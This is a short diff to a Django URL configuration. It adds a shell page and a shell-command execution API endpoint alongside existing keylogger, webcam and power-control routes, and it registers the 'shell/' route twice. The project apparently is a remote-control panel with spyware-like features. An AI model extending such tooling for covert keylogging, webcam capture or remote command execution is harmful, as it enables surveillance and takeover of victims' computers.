@@ -21,6 +21,8 @@ urlpatterns = [
     path('keylogger/', views.keylogger_page, name='keylogger'),
     
     path('webcam/', views.webcam_page, name='webcam'),
+
+    path('shell/', views.shell_page, name='shell'),
     
     path('power/', views.power_page, name='power'),
     
@@ -65,4 +67,8 @@ urlpatterns = [
     
     # API Endpoints - Power Control
     path('api/power/', views.power_action, name='api_power_action'),
+
+    # API Endpoints - CMD
+    path('shell/', views.shell_page, name='shell'),
+    path('api/shell/execute/', views.execute_shell_command, name='api_shell_execute'),
 ]
